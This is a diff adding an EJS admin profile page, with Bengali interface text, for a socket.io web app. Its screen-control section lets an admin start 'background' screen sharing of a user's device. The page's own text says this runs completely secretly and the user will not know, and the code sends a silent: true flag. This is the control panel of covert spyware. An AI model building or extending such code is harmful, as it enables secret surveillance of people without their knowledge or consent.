@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<title><%= user.name %> - ইউজার প্রোফাইল</title>
+<link rel="stylesheet" href="/style.css">
+<script src="/socket.io/socket.io.js"></script>
+<style>
+.profile-container {
+    max-width: 800px;
+    margin: 0 auto;
+    padding: 20px;
+}
+
+.profile-header {
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    color: white;
+    padding: 30px;
+    border-radius: 15px;
+    margin-bottom: 30px;
+    text-align: center;
+    position: relative;
+}
+
+.profile-avatar {
+    width: 120px;
+    height: 120px;
+    border-radius: 50%;
+    background: rgba(255,255,255,0.2);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 48px;
+    font-weight: bold;
+    margin: 0 auto 20px;
+    border: 4px solid rgba(255,255,255,0.3);
+}
+
+.status-badge {
+    position: absolute;
+    top: 20px;
+    right: 20px;
+    padding: 8px 16px;
+    border-radius: 25px;
+    font-weight: bold;
+    font-size: 12px;
+}
+
+.status-online {
+    background: #28a745;
+    color: white;
+}
+
+.status-offline {
+    background: #6c757d;
+    color: white;
+}
+
+.profile-sections {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 20px;
+    margin-bottom: 30px;
+}
+
+.section-card {
+    background: white;
+    padding: 25px;
+    border-radius: 15px;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+    border-left: 4px solid #667eea;
+}
+
+.section-title {
+    font-size: 18px;
+    font-weight: bold;
+    color: #333;
+    margin-bottom: 15px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+}
+
+.info-item {
+    display: flex;
+    justify-content: space-between;
+    padding: 8px 0;
+    border-bottom: 1px solid #f0f0f0;
+}
+
+.info-label {
+    font-weight: bold;
+    color: #666;
+}
+
+.info-value {
+    color: #333;
+}
+
+.screen-control-section {
+    background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
+    color: white;
+    grid-column: 1 / -1;
+    border-left: none;
+}
+
+.screen-control-section .section-title {
+    color: white;
+}
+
+.control-buttons {
+    display: flex;
+    gap: 15px;
+    margin-top: 20px;
+    flex-wrap: wrap;
+}
+
+.control-btn {
+    background: rgba(255,255,255,0.2);
+    color: white;
+    border: 2px solid rgba(255,255,255,0.3);
+    padding: 12px 20px;
+    border-radius: 8px;
+    cursor: pointer;
+    font-weight: bold;
+    transition: all 0.3s;
+    flex: 1;
+    min-width: 150px;
+}
+
+.control-btn:hover {
+    background: rgba(255,255,255,0.3);
+    transform: translateY(-2px);
+}
+
+.control-btn:disabled {
+    background: rgba(255,255,255,0.1);
+    cursor: not-allowed;
+    transform: none;
+    opacity: 0.6;
+}
+
+.control-btn.active {
+    background: rgba(255,255,255,0.3);
+    border-color: rgba(255,255,255,0.5);
+}
+
+.activity-log {
+    background: #f8f9fa;
+    padding: 20px;
+    border-radius: 10px;
+    margin: 20px 0;
+    max-height: 300px;
+    overflow-y: auto;
+}
+
+.log-item {
+    background: white;
+    padding: 10px 15px;
+    margin-bottom: 8px;
+    border-radius: 6px;
+    border-left: 3px solid #667eea;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+.log-time {
+    font-size: 12px;
+    color: #666;
+}
+
+.nav-menu {
+    display: flex;
+    justify-content: center;
+    gap: 15px;
+    margin: 20px 0;
+    flex-wrap: wrap;
+}
+
+.nav-box {
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    color: white;
+    padding: 10px 20px;
+    border-radius: 8px;
+    text-decoration: none;
+    font-weight: bold;
+    transition: transform 0.3s;
+    cursor: pointer;
+    font-size: 14px;
+}
+
+.nav-box:hover {
+    transform: translateY(-2px);
+    color: white;
+}
+
+@media (max-width: 768px) {
+    .profile-sections {
+        grid-template-columns: 1fr;
+    }
+    
+    .control-buttons {
+        flex-direction: column;
+    }
+    
+    .control-btn {
+        min-width: auto;
+    }
+}
+</style>
+</head>
+<body>
+<div class="nav-menu">
+    <a href="/admin_panel" class="nav-box">🏠 এডমিন প্যানেল</a>
+    <a href="/admin/user_information" class="nav-box">👥 ইউজার তথ্য</a>
+    <a href="/admin/screen_control" class="nav-box">🖥️ স্ক্রিন কন্ট্রোল</a>
+</div>
+
+<div class="profile-container">
+    <div class="profile-header">
+        <div class="status-badge <%= isOnline ? 'status-online' : 'status-offline' %>">
+            <%= isOnline ? '🟢 অনলাইন' : '🔴 অফলাইন' %>
+        </div>
+        
+        <div class="profile-avatar">
+            <%= user.name.charAt(0).toUpperCase() %>
+        </div>
+        
+        <h2 style="margin: 0;"><%= user.name %></h2>
+        <p style="margin: 10px 0 0 0; opacity: 0.8;"><%= user.email %></p>
+        <p style="margin: 5px 0 0 0; opacity: 0.7; font-size: 14px;">ইউজার ID: <%= user.userId %></p>
+    </div>
+
+    <div class="profile-sections">
+        <!-- ব্যক্তিগত তথ্য -->
+        <div class="section-card">
+            <div class="section-title">
+                👤 ব্যক্তিগত তথ্য
+            </div>
+            <div class="info-item">
+                <span class="info-label">নাম:</span>
+                <span class="info-value"><%= user.name %></span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">ইমেইল:</span>
+                <span class="info-value"><%= user.email %></span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">ইউজার ID:</span>
+                <span class="info-value"><%= user.userId %></span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">রেজিস্ট্রেশন:</span>
+                <span class="info-value"><%= new Date(user.createdAt || Date.now()).toLocaleDateString('bn-BD') %></span>
+            </div>
+        </div>
+
+        <!-- সংযোগের তথ্য -->
+        <div class="section-card">
+            <div class="section-title">
+                🌐 সংযোগের তথ্য
+            </div>
+            <% if (isOnline && connectedUser) { %>
+            <div class="info-item">
+                <span class="info-label">স্ট্যাটাস:</span>
+                <span class="info-value" style="color: #28a745;">অনলাইন</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">সংযুক্ত সময়:</span>
+                <span class="info-value"><%= new Date(connectedUser.connectedAt).toLocaleString('bn-BD') %></span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Socket ID:</span>
+                <span class="info-value" style="font-size: 10px;"><%= connectedUser.socketId %></span>
+            </div>
+            <% } else { %>
+            <div class="info-item">
+                <span class="info-label">স্ট্যাটাস:</span>
+                <span class="info-value" style="color: #dc3545;">অফলাইন</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">শেষ দেখা:</span>
+                <span class="info-value">তথ্য নেই</span>
+            </div>
+            <% } %>
+        </div>
+
+        <!-- স্ক্রিন কন্ট্রোল সেকশন -->
+        <div class="section-card screen-control-section">
+            <div class="section-title">
+                🖥️ স্ক্রিন শেয়ারিং কন্ট্রোল
+            </div>
+            <p style="margin: 10px 0; opacity: 0.9; font-size: 14px;">
+                এই সেকশন থেকে ইউজারের স্ক্রিন ব্যাকগ্রাউন্ডে দেখতে পারবেন। ইউজার বুঝতে পারবে না।
+            </p>
+            
+            <div class="control-buttons">
+                <% if (isOnline) { %>
+                <button class="control-btn" id="startSharingBtn" onclick="startBackgroundSharing()">
+                    📱 স্ক্রিন শেয়ারিং শুরু
+                </button>
+                <button class="control-btn" id="viewScreenBtn" onclick="viewUserScreen()" style="display: none;">
+                    👁️ স্ক্রিন দেখুন
+                </button>
+                <button class="control-btn" id="stopSharingBtn" onclick="stopBackgroundSharing()" style="display: none;">
+                    ⏹️ শেয়ারিং বন্ধ
+                </button>
+                <% } else { %>
+                <button class="control-btn" disabled>
+                    ⭕ ইউজার অফলাইন - স্ক্রিন শেয়ারিং অসম্ভব
+                </button>
+                <% } %>
+            </div>
+            
+            <div id="sharingStatus" style="margin-top: 15px; padding: 10px; background: rgba(255,255,255,0.1); border-radius: 6px; display: none;">
+                <span id="statusText">স্ট্যাটাস: প্রস্তুত</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- ক্রিয়াকলাপের লগ -->
+    <div class="section-card">
+        <div class="section-title">
+            📋 সাম্প্রতিক ক্রিয়াকলাপ
+        </div>
+        <div class="activity-log" id="activityLog">
+            <div class="log-item">
+                <span>প্রোফাইল পেজ লোড হয়েছে</span>
+                <span class="log-time"><%= new Date().toLocaleString('bn-BD') %></span>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+// Global variables
+const socket = io();
+const userId = '<%= user.userId %>';
+const userName = '<%= user.name %>';
+let isSharing = false;
+
+// Connect as admin
+socket.emit('admin_connect', {
+    adminId: 'admin1994',
+    name: 'Admin'
+});
+
+// স্ক্রিন শেয়ারিং শুরু করার ফাংশন
+function startBackgroundSharing() {
+    const confirmation = confirm(`${userName} এর ব্যাকগ্রাউন্ড স্ক্রিন শেয়ারিং শুরু করতে চান?\n\nনোট: এটি সম্পূর্ণ গোপনে চলবে। ইউজার জানতে পারবে না।`);
+    
+    if (confirmation) {
+        socket.emit('admin_start_background_screen_sharing', {
+            targetUserId: userId,
+            adminId: 'admin1994',
+            silent: true
+        });
+        
+        // UI আপডেট করা
+        updateSharingState('starting');
+        addActivityLog('ব্যাকগ্রাউন্ড স্ক্রিন শেয়ারিং শুরু করা হচ্ছে');
+    }
+}
+
+// স্ক্রিন দেখার ফাংশন
+function viewUserScreen() {
+    window.open(`/admin/screen_viewer/${userId}`, '_blank', 'width=1200,height=800');
+    addActivityLog('স্ক্রিন ভিউয়ার খোলা হয়েছে');
+}
+
+// স্ক্রিন শেয়ারিং বন্ধ করার ফাংশন
+function stopBackgroundSharing() {
+    if (confirm('স্ক্রিন শেয়ারিং বন্ধ করতে চান?')) {
+        socket.emit('admin_stop_background_screen_sharing', {
+            targetUserId: userId,
+            adminId: 'admin1994'
+        });
+        
+        updateSharingState('stopping');
+        addActivityLog('স্ক্রিন শেয়ারিং বন্ধ করা হচ্ছে');
+    }
+}
+
+// শেয়ারিং স্ট্যাটাস আপডেট করা
+function updateSharingState(state) {
+    const startBtn = document.getElementById('startSharingBtn');
+    const viewBtn = document.getElementById('viewScreenBtn');
+    const stopBtn = document.getElementById('stopSharingBtn');
+    const status = document.getElementById('sharingStatus');
+    const statusText = document.getElementById('statusText');
+    
+    status.style.display = 'block';
+    
+    switch(state) {
+        case 'starting':
+            startBtn.style.display = 'none';
+            viewBtn.style.display = 'none';
+            stopBtn.style.display = 'none';
+            statusText.textContent = 'স্ট্যাটাস: শেয়ারিং শুরু করা হচ্ছে...';
+            break;
+            
+        case 'active':
+            startBtn.style.display = 'none';
+            viewBtn.style.display = 'block';
+            stopBtn.style.display = 'block';
+            statusText.textContent = '🔴 স্ট্যাটাস: স্ক্রিন শেয়ারিং সক্রিয়';
+            statusText.style.color = '#ff6b6b';
+            isSharing = true;
+            break;
+            
+        case 'stopping':
+            viewBtn.style.display = 'none';
+            stopBtn.style.display = 'none';
+            statusText.textContent = 'স্ট্যাটাস: শেয়ারিং বন্ধ করা হচ্ছে...';
+            break;
+            
+        case 'inactive':
+            startBtn.style.display = 'block';
+            viewBtn.style.display = 'none';
+            stopBtn.style.display = 'none';
+            status.style.display = 'none';
+            isSharing = false;
+            break;
+    }
+}
+
+// লগ যোগ করার ফাংশন
+function addActivityLog(message) {
+    const logContainer = document.getElementById('activityLog');
+    const logItem = document.createElement('div');
+    logItem.className = 'log-item';
+    logItem.innerHTML = `
+        <span>${message}</span>
+        <span class="log-time">${new Date().toLocaleString('bn-BD')}</span>
+    `;
+    
+    logContainer.insertBefore(logItem, logContainer.firstChild);
+    
+    // সর্বোচ্চ 20টি লগ রাখা
+    const logs = logContainer.children;
+    if (logs.length > 20) {
+        logContainer.removeChild(logs[logs.length - 1]);
+    }
+}
+
+// Socket event listeners
+socket.on('background_screen_sharing_started', (data) => {
+    if (data.targetUserId === userId) {
+        updateSharingState('active');
+        addActivityLog('✅ ব্যাকগ্রাউন্ড স্ক্রিন শেয়ারিং সফলভাবে শুরু হয়েছে');
+        showNotification('স্ক্রিন শেয়ারিং সক্রিয়', 'success');
+    }
+});
+
+socket.on('background_screen_sharing_stopped', (data) => {
+    if (data.targetUserId === userId) {
+        updateSharingState('inactive');
+        addActivityLog('⏹️ ব্যাকগ্রাউন্ড স্ক্রিন শেয়ারিং বন্ধ হয়েছে');
+        showNotification('স্ক্রিন শেয়ারিং বন্ধ', 'info');
+    }
+});
+
+socket.on('screen_sharing_failed', (data) => {
+    if (data.targetUserId === userId) {
+        updateSharingState('inactive');
+        addActivityLog(`❌ ত্রুটি: ${data.error}`);
+        showNotification('স্ক্রিন শেয়ারিং ব্যর্থ', 'error');
+    }
+});
+
+// নোটিফিকেশন দেখানোর ফাংশন
+function showNotification(message, type = 'info') {
+    const notification = document.createElement('div');
+    notification.style.cssText = `
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        background: ${type === 'success' ? '#28a745' : type === 'error' ? '#dc3545' : '#007bff'};
+        color: white;
+        padding: 15px 20px;
+        border-radius: 10px;
+        z-index: 10000;
+        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        font-size: 14px;
+        max-width: 350px;
+    `;
+    notification.textContent = message;
+    
+    document.body.appendChild(notification);
+    
+    setTimeout(() => {
+        if (document.body.contains(notification)) {
+            document.body.removeChild(notification);
+        }
+    }, 5000);
+}
+
+console.log(`User profile loaded for: ${userName} (${userId})`);
+</script>
+</body>
+</html>
